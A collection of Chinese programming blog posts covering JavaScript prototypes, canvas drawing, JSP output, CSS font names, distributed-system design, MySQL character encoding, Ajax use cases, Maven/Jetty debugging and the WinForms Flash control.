无论什么时候，只要创建了一个新函数，就会根据一组特定的规则为该函数创建一个prototype属性，默认情况下prototype属性会默认获得一个constructor(构造函数)属性，这个属性是一个指向prototype属性所在函数的指针，有些绕了啊，写代码、上图！

function Person(){
                
            }




根据上图可以看出Person对象会自动获得prototyp属性，而prototype也是一个对象，会自动获得一个constructor属性，该属性正是指向Person对象。

当调用构造函数创建一个实例的时候，实例内部将包含一个内部指针（很多浏览器这个指针名字为__proto__）指向构造函数的prototype，这个连接存在于实例和构造函数的prototype之间，而不是实例与构造函数之间。


function Person(name){
                this.name=name;
            }
            
            Person.prototype.printName=function(){
                alert(this.name);
            }
            
            var person1=new Person('Byron');
            var person2=new Person('Frank');



 



Person的实例person1中包含了name属性，同时自动生成一个__proto__属性，该属性指向Person的prototype，可以访问到prototype内定义的printName方法，大概就是这个样子的



写段程序测试一下看看prototype内属性、方法是能够共享


function Person(name){
                this.name=name;
            }
            
            Person.prototype.share=[];
            
            Person.prototype.printName=function(){
                alert(this.name);
            }
            
            var person1=new Person('Byron');
            var person2=new Person('Frank');
            
            person1.share.push(1);
            person2.share.push(2);
            console.log(person2.share); //[1,2]



果不其然！实际上当代码读取某个对象的某个属性的时候，都会执行一遍搜索，目标是具有给定名字的属性，搜索首先从对象实例开始，如果在实例中找到该属性则返回，如果没有则查找prototype，如果还是没有找到则继续递归prototype的prototype对象，直到找到为止，如果递归到object仍然没有则返回错误。同样道理如果在实例中定义如prototype同名的属性或函数，则会覆盖prototype的属性或函数。


function Person(name){
                this.name=name;
            }
            
            Person.prototype.share=[];

            var person=new Person('Byron');
            person.share=0;
            
            console.log(person.share); //0而不是prototype中的[]


构造简单对象

当然prototype不是专门为解决上面问题而定义的，但是却解决了上面问题。了解了这些知识就可以构建一个科学些的、复用率高的对象，如果希望实例对象的属性或函数则定义到prototype中，如果希望每个实例单独拥有的属性或方法则定义到this中，可以通过构造函数传递实例化参数。



function Person(name){
                this.name=name;
            }
            
            Person.prototype.share=[];
            
            Person.prototype.printName=function(){
                alert(this.name);
            }






版权声明：本文为博主原创文章，未经博主允许不得转载。

Html5画布canvas小例
小例中用到了画布canvas的画矩形，画圆或弧，画线，画文字，颜色渐变。
其全部颜色 字体 图形都是通过js在canvas上绘制形成，总结了几个context对象的方法如下：
1.画矩形：fillRect(x, y, width, height)  //矩形左上角点x坐标，矩形左上角点y坐标, 矩形宽度，矩形高度
2.画圆： arc(x, y, radius, 0,  2*Math.PI, false); //圆心x坐标,圆心y坐标,圆半径,开始弧度,结束弧度,是否逆时针绘制
3.画线： beginPath(); //重置路径起点
            moveTo(80,30); //笔触移动至点（x,y）

            lineTo(180,30); //定义从当前点到点（x,y）的路径

            context.closePath();//定义从当前点到路径起点的路径 结束本个路径定义

            fill(); //填充路径

4.画文字：fillText("法国",65,100,560); //文字内容，起点x坐标，起点y坐标，文字总共最大宽度
5.定义渐变可用于矩形或文字：createLinearGradient(180,90,canvas.width,116); 
   //渐变开始点的 x 坐标，渐变开始点的y坐标, 渐变结束点的x坐标, 渐变结束点的y坐标
6.清除画布某部分的方法：clearRect(x,y,width,height)  //要清除的矩形左上角点x坐标，要清除的矩形左上角点y坐标,
要清除的矩形宽度，要清除的矩形高度     (清除即清除掉对应部分所画之物)
1.效果图：


2.代码：

<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title>canvas小例</title>
</head>
<body onload="draw('canvas')">
<canvas id="canvas" width="600" height="500"></canvas>
</body>
</html>
<script>
    function draw(id){
        var canvas=document.getElementById(id);
        var context=canvas.getContext("2d");

        //黑色背景  （矩形）
        context.fillStyle='#333';
        context.fillRect(0,0,600,450); // fillRect(x,y,width,height)

        //底部红色到粉色渐变条  （矩形 颜色渐变）
        var gradient1=context.createLinearGradient(0,450,600,500);
        gradient1.addColorStop("0","red");
        gradient1.addColorStop("1","pink");
        context.fillStyle=gradient1;
        context.fillRect(0,450,600,50);

        //左上角的橙色圆形右上方的三角形  （线）
        context.beginPath(); //重置路径起点
        context.moveTo(80,30); //笔触移动至点x,y
        context.lineTo(180,30); //定义从当前点到点x,y的路径
        context.lineTo(80,80);
        context.lineTo(80,30);
        context.closePath();//定义从当前点到路径起点的路径
        context.fillStyle="#f60";
        context.fill();

        //左上角的橙色圆形   （圆形）
        context.beginPath();
        context.arc(80,80,50,0,2*Math.PI,false);//arc(圆心x坐标,圆心y坐标,圆半径,开始弧度,结束弧度,是否逆时针绘制)
        context.closePath();
        context.fill();

        //左上角橙色圆形中的两个白色弧形  （弧形）
        context.fillStyle="yellow";
        context.beginPath();
        context.arc(80,95,40,-Math.PI/8,-Math.PI/8*7,true);
        context.closePath();
        context.fill();

        context.fillStyle="#fff";
        context.beginPath();
        context.arc(80,68,40,Math.PI/8,Math.PI/8*7,false);
        context.closePath();
        context.fill();


        //头部的渐变字“网上搜不到的行程计划”  （文字）
        context.font="bold 36px Verdana ";
        var gradient=context.createLinearGradient(180,90,canvas.width,116); //createLinearGradient(起点x坐标，起点y坐标,终点x坐标,终点y坐标)
        gradient.addColorStop("0","green");
        gradient.addColorStop("0.5","yellow");
        gradient.addColorStop("1.0","red");
        context.fillStyle=gradient;
        context.fillText("网上搜不到的行程计划",180,90);

        //中间两个“法国”大字
        context.font="bold 220px '微软雅黑'";
        context.textAlign='left';
        context.textBaseline="top";
        context.fillStyle="#f60";
        context.fillText("法国",65,100,560); //fillText(起点x坐标，起点y坐标，文字总共最大宽度)

        //底部“七天假期拥抱法国”字
        context.font="bold 50px '微软雅黑','宋体'";
        context.strokeStyle="#fff";
        context.strokeText("七天假期拥抱法国",85,370);

        //底部“七天假期拥抱法国”字的叠加
        context.font="bold 50px '微软雅黑','宋体'";
        context.fillStyle="rgba(255,255,255,0.3)";
        context.fillText("七天假期拥抱法国",105,385);

    }

</script>




版权声明：本文为博主原创文章，未经博主允许不得转载。

Jsp 中out.println()为什么不换行
今天写了一串jsp代码，本想着使用out.println()会实现换行，然而结果却没换行。 
先看代码：
<%--使用out.print("Hello JSP");方式输出 --%>
    <%
        for(int i=0;i<10;i++){
            out.println("Hello JSP");
        }
     %>
输出结果是这样的： 

百度后找到原因了。如下： 
    因为html的换行是，out.println的东西就相当于在页面写html代码 ，  html代码换行并不能导致页面显示的换行，还得在要换行的代码后加 . 
      因此你的程序得这样写： 
<%--使用out.print("Hello JSP");方式输出 --%>
    <%
        for(int i=0;i<10;i++){
            out.println("Hello JSP<br>");
        }
     %>
结果如下： 
 
知识点补充：表示一条横线.

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        

版权声明：本文为博主原创文章，未经博主允许不得转载。

Css font-family字体对照表
 




Css font-family字体对照表




宋体


SimSun




黑体


SimHei




微软雅黑


Microsoft YaHei




微软正黑体


Microsoft JhengHei




新宋体


NSimSun




新细明体


PMingLiU




细明体


MingLiU




标楷体


DFKai-SB




仿宋


FangSong




楷体


KaiTi




仿宋_GB2312


FangSong_GB2312




楷体_GB2312


KaiTi_GB2312




华文细黑


STHeiti Light [STXihei]




华文黑体


STHeiti




华文楷体


STKaiti




华文宋体


STSong




华文仿宋


STFangsong




儷黑 Pro


LiHei Pro Medium




儷宋 Pro


LiSong Pro Light




標楷體


BiauKai




蘋果儷中黑


Apple LiGothic Medium




蘋果儷細宋


Apple LiSung Light




Windows的一些




新細明體


PMingLiU




細明體


MingLiU




標楷體


DFKai-SB




黑体


SimHei




新宋体


NSimSun




仿宋


FangSong




楷体


KaiTi




仿宋_GB2312


FangSong_GB2312




楷体_GB2312


KaiTi_GB2312




微軟正黑體


Microsoft JhengHei




微软雅黑体


Microsoft YaHei




装Office会生出来的一些




隶书


LiSu




幼圆


YouYuan




华文细黑


STXihei




华文楷体


STKaiti




华文宋体


STSong




华文中宋


STZhongsong




华文仿宋


STFangsong




方正舒体


FZShuTi




方正姚体


FZYaoti




华文彩云


STCaiyun




华文琥珀


STHupo




华文隶书


STLiti




华文行楷


STXingkai




华文新魏


STXinwei




 
 

版权声明：都是兄弟，请随意转载，请注明兄弟是谁

分布式系统的特点以及设计理念
    
    分布式系统并不是什么新鲜词，在上个世纪七八十年代就已经有各种分布式系统出现。只是在互联网时代，分布式系统才大放异彩，尤其是Google更是把分布式系统运用到了极致。Google整个的软件构架都是基于各种各样的分布式系统，诸如Borg、MapReduce、BigTable等。正是这些分布式系统，使得Google可以处理高并发请求响应以及海量数据处理等。Apache旗下的Hadoop、Spark、Mesos等分布式系统，把大数据处理相关技术变得非常亲民，让更多企业客户体会到了分布式系统的便利。


一、分布式系统的特点


    分布式系统最大的特点是可扩展性，它能够适应需求变化而扩展。企业级应用需求经常随时间而不断变化，这也对企业级应用平台提出了很高的要求。企业级应用平台必须要能适应需求的变化，即具有可扩展性。比如移动互联网2C应用，随着互联网企业的业务规模不断增大，业务变得越来越复杂，并发用户请求越来越多，要处理的数据也越来越多，这个时候企业级应用平台必须能够适应这些变化，支持高并发访问和海量数据处理。分布式系统有良好的可扩展性，可以通过增加服务器数量来增强分布式系统整体的处理能力，以应对企业的业务增长带来的计算需求。


    分布式系统的核心理念是让多台服务器协同工作，完成单台服务器无法处理的任务，尤其是高并发或者大数据量的任务。分布式系统由独立的服务器通过网络松散耦合组成的。每个服务器都是一台独立的PC机，服务器之间通过内部网络连接，内部网络速度一般比较快。因为分布式集群里的服务器是通过内部网络松散耦合，各节点之间的通讯有一定的网络开销，因此分布式系统在设计上尽可能减少节点间通讯。此外，因为网络传输瓶颈，单个节点的性能高低对分布式系统整体性能影响不大。比如，对分布式应用来说，采用不同编程语言开发带来的单个应用服务的性能差异，跟网络开销比起来都可以忽略不计。因此，分布式系统每个节点一般不采用高性能的服务器，而是性能相对一般的普通PC服务器。提升分布式系统的整体性能是要通过横向扩展（增加更多的服务器），而不是纵向扩展（提升每个节点的服务器性能）。


    分布式系统最大的特点是廉价高效：由成本低廉的PC服务器组成的集群，在性能方面能够达到或超越大型机的处理性能，在成本上远低于大型机。这也是分布式系统最吸引人之处。成本低廉的PC服务器在硬件可靠性方面比大型机相去甚远，于是分布式系统由软件来对硬件进行容错，通过软件来保证整体系统的高可靠性。
分布式系统最大的好处是实现企业应用服务层面的弹性扩展。应用服务层面的弹性扩展是相对计算资源层面的弹性扩展而言的。一般公有云服务（IaaS）厂商都会提供计算资源层面的弹性扩展，比如可以很方便地增加或删除虚拟主机、提升或降低虚拟主机的性能配置等等。但是企业客户真正需要的是应用服务层面的弹性扩展，即随着业务量的涨落，后台应用服务的实例能动态变化，这是IaaS厂商还做不到的。比如，某移动互联网短视频分享应用，在晚间11点到凌晨1点是访问高峰，同时在线人数高达几十万，这时后台应用服务要扩张到数千个实例才能应付这么高并发的访问请求；过了高峰时段，后台应用服务可以收缩到几十个实例。有了分布式系统，就可以很方便地调度应用服务实例，从几十个到几百个甚至上千个，真正实现应用服务的弹性扩展。


二、分布式系统设计理念


    上面简单介绍了分布式系统的基本情况，下面详细阐述笔者理解的几个分布式系统设计理念：


1. 分布式系统对服务器硬件要求很低


这一点主要现在如下两个方面：


    对服务器硬件可靠性不做要求，允许服务器硬件发生故障，硬件的故障由软件来容错。所以分布式系统的高可靠性是由软件来保证。 


    对服务器的性能不做要求，不要求使用高频CPU、大容量内存、高性能存储等等。因为分布式系统的性能瓶颈在于节点间通讯带来的网络开销，单台服务器硬件性能再好，也要等待网络IO。 


一般而言，互联网公司的大型数据中心都是选用大量廉价的PC服务器而不是用几台高性能服务器搭建分布式集群，以此来降低数据中心成本。比如，Google对于数据中心的成本控制做到了极致：所有服务器一律不要机箱；主板完全定制，只要最基本的组件，早期的定制主板连电源开关和USB接口都不要；在主板上加装隔离带把CPU单独隔出来，让冷风只吹CPU，不吹内存、硬盘等不需要降温的组件，最大限度降低冷却电力消耗。


2. 分布式系统强调横向可扩展性


    横向可扩展性（Scale Out）是指通过增加服务器数量来提升集群整体性能。纵向可扩展性（Scale Up）是指提升每台服务器性能进而提升集群整体性能。纵向可扩展性的上限非常明显，单台服务器的性能不可能无限提升，而且跟服务器性能相比，网络开销才是分布式系统最大的瓶颈。横向可扩展性的上限空间比较大，集群总能很方便地增加服务器。而且分布式系统会尽可能保证横向扩展带来集群整体性能的（准）线性提升。比如有10台服务器组成的集群，横向扩展为100台同样服务器的集群，那么整体分布式系统性能会提升为接近原来的10倍。


    互联网公司的数据中心，一般一个分布式系统横向扩展的上限在万台服务器左右。Google数据中心的基本单元，CELL，由两万台左右服务器组成，每个CELL由一套分布式管理系统，BORG，统一管理，每个数据中心都由多个CELL组成。


3. 分布式系统不允许单点失效（No Single Point Failure）


    单点失效是指，某个应用服务只有一份实例运行在某一台服务器上，这台服务器一旦挂掉，那么这个应用服务必然也受影响而挂掉，导致整个服务不可用。例如，某网站后台如果只在某一台服务器上运行一份，那这台服务器一旦宕机，该网站服务必然受影响而不可用。再比如，如果所有数据都存在某一台服务器上，那一旦这台服务器坏了，所有数据都不可访问。


    因为分布式系统的服务器都是廉价的PC服务器，硬件不能保证100%可靠，所以分布式系统默认每台服务器随时都可能发生故障挂掉。同时分布式系统必须要提供高可靠服务，不允许出现单点失效，因此分布式系统里运行的每个应用服务都有多个运行实例跑在多个节点上，每个数据点都有多个备份存在不同的节点上。这样一来，多个节点同时发生故障，导致某个应用服务的所有实例都挂掉、或某个数据点的多个备份都不可读的概率大大降低，进而有效防止单点失效。


    通常情况，不要让服务器满负荷运行，服务器长时间满负荷运行的话，出故障的概率显著升高。所以分布式系统采用一大堆中低性能的PC服务器，尽可能把负载均摊到所有服务器上，让每台服务器的负载都不高，保证集群整体稳定性。


4. 分布式系统尽可能减少节点间通讯开销


    如前所述，分布式系统的整体性能瓶颈在于内部网络开销。目前网络传输的速度还赶不上CPU读取内存或硬盘的速度，所以减少网络通讯开销，让CPU尽可能处理内存的数据或本地硬盘的数据，能显著提高分布式系统的性能。典型的例子就是Hadoop MapReduce，把计算任务分配到要处理的数据所在的节点上运行，从而避免在网络上传输数据。


5. 分布式系统应用服务最好做成无状态的


    应用服务的状态是指运行时程序因为处理服务请求而存在内存的数据。分布式应用服务最好是设计成无状态。因为如果应用程序是有状态的，那么一旦服务器宕机就会使得应用服务程序受影响而挂掉，那存在内存的数据也就丢失了，这显然不是高可靠的服务。把应用服务设计成无状态的，让程序把需要保存的数据都保存在专门的存储上，这样应用服务程序可以任意重启而不丢失数据，方便分布式系统在服务器宕机后恢复应用服务。


    比如，在设计网站后台的时候，对于用户登陆请求，可以把登陆用户的session相关信息保存在Redis或Memcache等缓存服务中，这样每个网站的后台实例不保存用户登录状态，这样即使重启网站后台程序也不丢失用户的登录状态信息；如果把用户的session相关信息保存在网站后台程序的内存里，那一旦受理用户登录的网站后台程序实例挂掉，必然有用户的登录状态信息会丢失。



    总而言之，分布式系统是大数据时代企业级应用的首选平台，它有良好的可扩展性，尤其是横向可扩展性（Scale Out），使得分布式系统非常灵活，能应对千变万化的企业级需求，而且降低了企业客户对服务器硬件的要求，真正能做到应用服务层面的弹性扩展（auto-scaling）。


转自（http://www.infoq.com/cn/articles/features-and-design-concept-of-distributed-system/）

版权声明：本文为博主原创文章，未经博主允许不得转载。

个人小记   html5  video标签
最近在制作网页播放视频的时候，毫不迟疑的选择了video标签，但是在使用的时候遇到了奇葩的问题。
video学习地址：http://www.w3school.com.cn/html5/html5_video.asp
在使用标签播放MP4视频的时候，有声音但是没有视频画面
使用示例如下：

<video src="/data/ship.mp4" type="video/mp4"  id="player1" poster="../media/echo-hereweare.jpg" controls="controls" preload="none" style="width:100%;"></video>



总以为是标签的问题，在网上也找了许多的帖子，没能找到解决办法，后来让同事重新导出视频文件，
大概导出3~4次之后，视频终于能够显示出来了。后来目标转向视频文件上，网上也有人说MP4的文件编码方式
是要用H264来编码的。也让同事pose出导出视频时的设置（使用的时狸窝工具）大家可以自选视频转换工具试试
详细设置可见图片。







版权声明：本文为博主原创文章，未经博主允许不得转载。

微信开发之mysql字符编码
首先是获取code以后不能用ajax请求微信api数据。这个和ajax跨域访问有关系
得到用户信息之后存到mysql,发现中文全部变成了??
网上搜了一下，发现是字符编码问题。
修改配置文件/etc/mysql/my.conf
在[mysql]下
default-character-set=utf8
在[mysqld]下
character-set-server=utf8

重启就失败
job failed to start
mysql -t

socket 没连接
后来发现原来版本不一样修改方法是不一样的


[mysqld]下添加的应该为：

character-set-server=utf8

collation-server=utf8_general_ci

这样就可以了

附上　查看mysql字符编码命令

SHOW VARIABLES LIKE 'character_set_%';


查看数据库字符集

status


查看表的字符集

show full cloumns from user;




版权声明：本文为博主原创文章，未经博主允许不得转载。

表格标签的使用
<html>
	<head>
		<title>表单标签</title>
	</head>
	<body>	
		<form>		
			<table border="1" color ="#112233" align="center">
			<caption align = "center">注册页面</caption>
				<tr>
					<td>用户名:</td>
						<td><input type ="text" name = "usrename"></td>								
				</tr>
				<tr>
					<td>密码:</td>
					<td><input type = "passward" name="passward"></td>					
				</tr>
				<tr>
					<td>性别:</td>										
					<td collapse="2"><input type = "radio" name="sex" checked="checked">男										
					<input type = "radio" name="sex">女</td>											
				</tr>
				<tr>
					<td collapse="3">爱好:</td><td><input type = "checkbox" name="play">打球
					<input type = "checkbox" name="play">写程序
					<input type = "checkbox" name="play">玩儿游戏</td>
				</tr>
				<tr>
					<td>地址:</td>
						<td><select name="provience">
						<option>贵州</option>
						<option>四川</option>
						<option>云南</option>
						</select>
						<select name="place">
							<option>遵义</option>
							<option>昆明</option>
							<option>广元</option>
						</select>
						</td>
				</tr>
				<tr>
					<td>头像:</td>
					<td><input type = "file" name="pic"></td>
				</tr>
				<tr>
					<td>介绍:</td>
						<td><textarea" name="area"></textarea></td>
				<tr >
					<td collapse="2"  align="center" >
						<input type = "submit" value="注册">   <input type = "reset" value="取消">
					</td>
				</tr>
			</table>
		</form>
	</body>
</html>

版权声明：本文为博主原创文章，未经博主允许不得转载。

Ajax适用场景
职业能改变人的思想，顺便牵扯点作为人的行为。咱就是搞java应用开发的也就好这口。有什么新鲜玩意都要试把试把。有些时候真的不是因需要而去应用，就像去街边看人pk突个新鲜。ajax近来吵的很火所以很多中国人也都愿意以身试法。试图参透其奥妙所在。新鲜嘛！但这种激情往往使人忘记了理智。激情是要建立在理性的基础上才能发挥其最大作用。这点思想如果忘却，不失为大错。 　　其实你选择他如果自己做实验或玩玩几个小case还是可以，也是比较让人赞同。这说明你这个人有探索精神。有进取心，是个人才。总比很多一无事处的混混强得多。而如果不分青红一贯的应用于真实的高用户高并发量的系统项目中，恐怕是个不明智之举，仅代表个人意见。因为我也是参照其作用、利用其长处、杀敌人于无形。孙子是个很厉害的人为什么人家研究兵法多少年都不会落伍。那是因为他抓住了事物的本质。就像我们做软件应用业务原型就对系统建模型一样。因为其稳固必然长久，这是道理。我们想让自己的项目不至于最终落魄到只能大范围架构级的重构，不如选择放弃。因此当做决定前应该尽量想到前因后果，方之上上策。 　　你要看热闹，是什么驱动你去看这次热闹。这需要分析。如果根据场景不同你发现打架的人是你的朋友亲戚。你必然参与这次活动。 　　你要使用ajax，是什么驱动你去使用它。我们分析。我们不是为了用而用。而是为了发挥其作用而用。如果将其作用发挥到我们的业务中，这才是次有意义的活动。 　　我们设计，在什么地方应用。不能一味的应用。选择性的应用发挥其长处、弊其短处应该是好的选择。 　　以下为应用设计时的参考资料： 　　【导读】本文简述了Ajax技术适用场景、Ajax不适用场景的具体情况以及应用时候存在的一些问题。 　　Ajax适用场景　　1.表单驱动的交互　　传统的表单提交，在文本框输入内容后，点击按钮，后台处理完毕后，页面刷新，再回头检查是否刷新结果正确。使用Ajax，在点击sunmit按钮后，立刻进行异步处理，并在页面上快速显示了更新后的结果，这里没有整个页面刷新的问题。　　2.深层次的树的导航　　深层次的级联菜单（树）的遍历是一项非常复杂的任务，使用JavaScript来控制显示逻辑，使用Ajax延迟加载更深层次的数据可以有效的减轻服务器的负担。　　我们以前的对级联菜单的处理多数是这样的：　　为了避免每次对菜单的操作引起的重载页面，不采用每次调用后台的方式，而是一次性将级联菜单的所有数据全部读取出来并写入数组，然后根据用户的操作用 JavaScript来控制它的子集项目的呈现，这样虽然解决了操作响应速度、不重载页面以及避免向服务器频繁发送请求的问题，但是如果用户不对菜单进行 操作或只对菜单中的一部分进行操作的话，那读取的数据中的一部分就会成为冗余数据而浪费用户的资源，特别是在菜单结构复杂、数据量大的情况下（比如菜单有 很多级、每一级菜又有上百个项目），这种弊端就更为突出。　　如果在此案中应用Ajax后，结果就会有所改观：　　在初始化页面时我们只读出它的第一级的所有数据并显示，在用户操作一级菜单其中一项时，会通过Ajax向后台请求当前一级项目所属的二级子菜单的所有数据，如 果再继续请求已经呈现的二级菜单中的一项时，再向后面请求所操作二级菜单项对应的所有三级菜单的所有数据，以此类推……这样，用什么就取什么、用多少就取 多少，就不会有数据的冗余和浪费，减少了数据下载总量，而且更新页面时不用重载全部内容，只更新需要更新的那部分即可，相对于后台处理并重载的方式缩短了 用户等待时间，也把对资源的浪费降到最低。　　3.快速的用户与用户间的交流响应　　在众多人参与的交流讨论的场景下，最不爽的事情就是让用户一遍又一遍刷新页面以便知道是否有新的讨论出现。新的回复应该以最快的速度显示出来，而把用户从分神的刷新中解脱出来，Ajax是最好的选择。　　4.类似投票、yes/no等无关痛痒的场景　　对于类似这样的场景中，如果提交过程需要达到40秒，很多的用户就会直接忽略过去而不会参与，但是Ajax可以把时间控制在1秒之内，从而更多的用户会加入进来。　　5.对数据进行过滤和操纵相关数据的场景　　对数据使用过滤器，按照时间排序，或者按照时间和名称排序，开关过滤器等等。任何要求具备很高交互性数据操纵的场合都应该用JavaScript，而不是用一系列的服务器请求来完成。在每次数据更新后，再对其进行查找和处理需要耗费较多的时间，而Ajax可以加速这个过程。　　6.普通的文本输入提示和自动完成的场景　　在文本框等输入表单中给予输入提示，或者自动完成，可以有效的改善用户体验，尤其是那些自动完成的数据可能来自于服务器端的场合，Ajax是很好的选择。　　Ajax不适用场景　　1.部分简单的表单　　虽然表单提交可以从Ajax获取最大的益处，但一个简单的评论表单极少能从Ajax得到什么明显的改善。而一些较少用到的表单提交，Ajax则帮不上什么忙。　　2.搜索　　有些使用了Ajax的搜索引擎如Start.com和Live.com不允许使用浏览器的后退按钮来查看前一次搜索的结果，这对已经养成搜索习惯的用户来说是不可原谅的。　　现在Dojo通过iframe来解决这个问题。　　3.基本的导航　　使用Ajax来做站点内的导航是一个坏主意，为什么不把时间放在让系统程序作的更好上呢？　　4.替换大量的文本　　使用Ajax可以实现页面的局部刷新，但是如果页面的每个部分都改变了，为什么不重新做一次服务器请求呢？　　5.对呈现的操纵　　Ajax看起来像是一个纯粹的UI技术，但事实上它不是。它实际上是一个数据同步、操纵和传输的技术。对于可维护的干净的web应用，不使用Ajax来控制页面呈现是一个不错的主意。JavaScript可以很简单的处理XHMTL/HTML/DOM，使用CSS规则就可以很好的表达数据显示。　　存在的问题　　1.用JavaScript作的Ajax引擎，JavaScript的兼容性和DeBug都是让人头痛的事；　　2.Ajax的无刷新重载，由于页面的变化没有刷新重载那么明显，所以容易给用户带来困扰?D?D用户不太清楚现在的数据是新的还是已经更新过的；现有的解决有：在相关位置提示、数据更新的区域设计得比较明显、数据更新后给用户提示等；　　3.中间过程不能被bookmark。解决方法：GoogleMaps通过在页面上提供一个”link to this page”的办法来解决。另外，还可以通过url链接中加无效的?^标记来解决，但还未验证。 我觉得ibm开发者论坛中有个老大不记得什么名字了说的不错 跟j2ee的现有成熟表现层框架结合使用是比较好的一个选择。因需而用不会给自己断掉很多后路。一味的尝试或许就有苦果等待、诱惑、刺激、引导你失去理智。    
        
版权声明：感觉我写的还算不错的的话希望你能够动动你的鼠标和键盘为我点上一个赞或是为我奉献上一个评论，在下感激不尽!_______________________________________________________欢迎转载，希望在你转载的同时，添加原文地址，谢谢配合

【Maven】maven工程 调试出现 Source not found ，开启jetty调试
问题：maven工程使用jetty 调试出现 Source not found，解决如下：


1、开启MAVEN_OPTS的调试参数
配置如下：-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=1066
配置的地方如下：




2、参数含义如下：
-Xdebug :通知JVM工作DEBUG模式下
-Xrunjdwp:通知JVM使用Java Debug wire protocol来运行环境
transport ：调试数据的传送方式，dt_socket使用socket方式
server ：是否支持server模式的vm中
suspend：是否在调试客户端建立起来后，再执行JVM
address：是和调试器通信的端口，不是服务的端口号
-Xnoagent: 禁用默认sun.tools.debug调试器 
-Djava.compiler=NONE: 禁止JIT编译器的加载 
dt_shmem: 共享内存传输，仅限于Windows 



3、开启 Remote Java Application，如下图，注意port对应address








4、重新启动



版权声明：本文为博主原创文章，未经博主允许不得转载。

Winform(C#)Flash控件 属性 方法 事件
 
我的用户控件—》右键 添加/移除项 —》COM组件—》ShockwaveFlash Object 打勾
 
属性:
1.AlignMode （读写） 
语法：AlignModeAs Long 
说明：对齐方式（与SAlign 属性联动）。当控件的长宽比例与影片不一致且 WMode 不为 ExactFit 时，影片（没有被放大的）在控件中显示的位置可用该属性调整。该属性值由标志位组成。如图，将该属性值（二进制）中相 应的位标记为 1 就设置了相应的对齐方向。

属性值与相应的对齐方式（后面括号里是二进制数） 
1：左对齐(0001)　　2：右对齐(0010)　　
4：顶对齐(0100)　　8：底对齐(1000) 
也可以组合各种对齐方式，同时将两个或以上的位标 记为 1 ，也就是将这四个基本值组合相加。比如同时左对齐和顶对齐，属性值则设为 5（0101）。 
例子 ：设置影片为右对齐 ：movie.AlignMode = 2 
 
2.BackgroundColor（读写） 
语法：BackgroundColorAs Long 
说明：影片的背景色（与BGColor 联动）。以（红× 65536＋绿× 256 ＋蓝）计算颜色值。红绿蓝颜色取 值范围（0-255 ）。默认的影片背景色为 -1。如果影片 设置了底色或有图片当作背景，那么看不出来该属性值的改变会有什么影响 。

 
例子：将影片背景色设为蓝色 ： 
movie.BackgroundColor = 255 
 
3.Base （读写） 
语法：Base AsString 
说明：指定用于解决影片中所有相对路径的声明的基 地址。当影片与其需要的其他文件不在同一目录中的时候该 属性特别有用。如不特别指定，Base 的值默认为"."，也就 是当前影片所在的路径。

例子 ： 
movie.Base ="Http://www.domain.com/pathname1/pathname2" 
 
4.BGColor （读写） 
语法：BGColor AsString 
说明：影片的背景色（与BackgroundColor 联动）。与BackgroundColor 不同的是，BGColor 是一个六位的十六进 制数，每两位分别代表红绿蓝颜色值。如：FFEEAA 表示 红色值为 FF、绿色值为 EE 、蓝色值为 AA 。

例子：将影片背景色设为红色 ： 
movie.BGColor = "FF0000" 
 
5.DeviceFont （读写） 
语法：DeviceFontAs Boolean 
说明 ：决定是否使用影片内嵌的字体 ， 默认值为 False 。将该属性值设为 True 则强制播放器不使用影片中 内嵌的字体而使用本地系统字体。 
例子：movie.DeviceFont= True 
 
6.EmbedMovie （读写） 
语法：EmbedMovieAs Boolean 
说明：影片是否被存贮到控件所在的容器中。当你已 载入一个影片后将该属性设为 True ，播放影片时就不必再 去读 SWF 文件了。这使得在PowerPoint 简报或 VB 程序 里使用 Flash 影片更容易。但将该属性设为 True 后，控 件的 Movie 属性就不再接受新的值了。要想播放另一个影片（给 Movie 属性赋新值），必须先将 EmbedMovie 属 性设为 False 。

例子 ：movie.EmbedMovie = True 
 
7.FrameNum （读写） 
语法：FrameNum AsLong 
说明：影片当前帧的编号 （从 0 开始计数）。设置 该属性值将使影片停在由 FrameNum 指定的帧处。 
例子 ：显示当前帧数 ： MsgBox " 当前显示的是第 " & movie.FrameNum & " 帧。" 
使影片显示第 10 帧： Bomovie.FrameNum = 9 
 
8.Loop （读写） 
语法：Loop AsBoolean 
说明：是否循环播放。设为True 是循环播放，设为 False则只播放一次。 
例子 ：movie.Loop = True 
 
9.Menu （读写） 
语法：Menu AsBoolean 
说明：是否显示菜单。设为True 显示所有菜单，设 为 False 菜单被屏蔽，但仍有一项“About Macromedia FlashPlayer...”。如果你实在不喜欢这个菜单，应该在程序中通过拦截鼠标消息的方法来达到目的。与在独立的 F l a s h 播放器中不同的是，在控件的右键菜单里点“About...”的话，将打开浏览器到 Macromedia 的网站上去 看 About 了。
movie.Menu = False 
 
10.Movie （读写） 
语法：Movie AsString 
说明：要播放的影片路径（URL）。设置该属性为 一个 SWF 文件的 URL 将载入文件并播放它。若影片是在 本地硬盘上，要写成从盘符开始的绝对路径；若影片是在某网站上，也要写全 URL 地址。

例子 ：
movie.Movie="http://www.domain.com/path1/path2/filename.swf"
或movie.Movie="c:\temp\test.swf"
 
11.Playing （只读） 
语法：Playing AsBoolean 
说明：当前播放状态。如果影片正在播放，该属性 值为 True ，否则为 False 。 
例子 ： If movie.Playing = False Then MsgBox " 影片已停止播放！ "
 EndIf 
 
12.Quality （读写） 
语法：Quality AsLong 
说明：画面质量（与Quality2 联动）。Quality 可 以取: 
0 ——相当于 Quality2 取 "Low" 
1 ——相当于 Quality2 取 "High" 
2 ——相当于 Quality2 取 "AutoLow" 
3 ——相当于 Quality2 取 "AutoHigh" 例子 ： movie.Quality = 1 
 
13.Quality2（读写） 
语法：Quality AsString 
说明：画面质量(与 Quality 联动)。Quality2 可以取: Low ：偏重于播放速度而不管显示效果，而且不启用消锯齿功能 。 
High ：偏重于画面而不管播放速度，并且总是启用消锯齿功能。如果影片中不包含动画就平滑处理位图；如 果有动画，那么位图就不被平滑处理。（这里的动画应该是把一张图片做平移或旋转）

AutoLow ：先着重于播放速度，但只要有可能就改善显示效果。一开始播放时先禁用消锯齿功能。如果播放 器检测到处理器能承受得了，就启用消锯齿功能 。 
